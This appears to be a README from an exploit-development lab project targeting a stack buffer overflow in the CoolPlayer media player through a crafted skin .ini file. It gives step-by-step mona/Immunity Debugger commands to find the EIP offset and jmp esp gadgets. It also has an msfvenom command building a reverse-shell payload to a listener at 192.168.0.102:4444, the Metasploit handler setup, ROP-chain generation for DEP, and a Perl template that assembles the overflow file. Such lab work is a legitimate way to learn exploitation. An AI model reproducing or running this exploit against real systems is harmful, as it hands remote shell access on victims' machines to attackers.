# Exploit Dev

* see [requirements](Requirements.md)
* see [TODO](TODO.md)
* see [Limiting Factors](LimFact.md)
* see [Layout](Layout.md)
* see [Resources](Resources.md)

## How To

1) No Dep
   1) Set up
      2) Add *mona.py* to ```C:\Program Files\Immunity Inc\Immunity Debugger\PyCommands```
   2) Basic
      1) Windows
         1) Run ```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```
         2) Add the string to *pattern.pl*
         3) Run ```perl pattern.pl```
         4) Load Immunity Debugger
         5) Add *Cool Player* to Immunity Debugger
         6) Attach *pattern.ini* to *Cool Player*
         7) In Immunity Debugger run ```!mona findmsp```
            1) Location of EIP
            2) Size to work with
         8) In Immunity Debugger run ```!mona jmp -r esp```
            1) find ESP that points to EIP
         9) Select a jmp esp that does not contain null bytes
            1) Put all the code together into *proofofConcept.pl*
                1) Usable bytes
                   1) shell code needs to be <
                2) Distance to EIP
                3) Nop slide
                4) Shellcode
         10) Reset Immunity Debugger
         11) Run ```perl proofofConcept.pl```
         12) Attach *proofofConcept.ini* to *Cool Player*
   3) Advanced
      1) Kali
         1) run ```msfvenom -a x86 --platform Windows -p windows/shell_reverse__tcp LHOST=192.168.0.102 LPORT=4444 -e x86/alpha_upper -b '\x00' -f perl >shell.pl```
         2) ```msfconsole```
         3) ```use handler/multi```
            1) ```show options```
               1) ```set payload windows/shell_reverse_tcp```
               2) ```set lhost 192.168.0.102```
               3) ```set lport 4444```
               4) ```exploit```
      2) Windows
         1) Optional
            1) Load Immunity Debugger
            2) Add *Cool Player* to Immunity Debugger
         2) Add shellcode to *shell.pl*
            1) confirm variable names
         3) Run ```perl shell.pl```
         4) Attach *shell.ini* to *Cool Player*
      3) Kali
         1) view listener

2) DEP On
   1) Windows
      1) Enable Dep
      2) Pre Generation
         1) Load Immunity Debugger
         2) Add *Cool Player* to Immunity Debugger
         3) Run *Cool Player*
      3) Generating the Chain
         1) In Immunity Debugger run ```!mona rop -m msvcrt.dll -cp '\x00\x0a'```
            1) This generates the rop chain
         2) In Immunity Debugger run ```!mona find -type instr -s "retn" -m msvcrt.dll -cp '\x00\x0a' -x x```
         3) Run ```perl ropCalc.pl```

## Code

### Pattern Generation

*note: navigate to ```C:\cmd``` in cmd line*

```pattern_create 3000 > "C:\Documents and Settings\Administrator\Desktop\pattern.txt"```

### Perl

### template_shell.pl

```perl
my $file="shell.ini"; # file name
my $header="[CoolPlayer Skin]\nPlaylistSkin="; # file header
            # we know the offset is at 1056
my $pattern = "A" x 1056;
my $eip = pack('V',0x769ecf49); # eip
my $nopeslide = "\x90" x 16;
my $shellcode =         #shellcode


open($FILE,">$file");
print $FILE $header.$pattern.$eip.$nopeslide.$shellcode;
close($FILE);
```

### Mona

```!mona findmsp```
```!mona jmp -r esp```
```!mona rop -m msvcrt.dll -cp '\x00\x0a'```
```!mona find -type instr -s "retn" -m msvcrt.dll -cp '\x00\x0a' -x x```

#### Results

```text
[+] Looking for cyclic pattern in memory
    Cyclic pattern (normal) found at 0x001257d0 (length 212 bytes)
    Cyclic pattern (normal) found at 0x00137341 (length 2500 bytes)
    -  Stack pivot between 71501 & 74001 bytes needed to land in this pattern
    EIP contains normal pattern : 0x42326a42 (offset 1056)
    ESP (0x00125bf4) points at offset 1060 in normal pattern (length 1440)
    EBP contains normal pattern : 0x316a4230 (offset 1052)
    ESI (0x00125bfc) points at offset 1068 in normal pattern (length 1432)
```

### CoolPlayer Skin Format

```text
[CoolPlayer Skin]

PlaylistSkin=
```
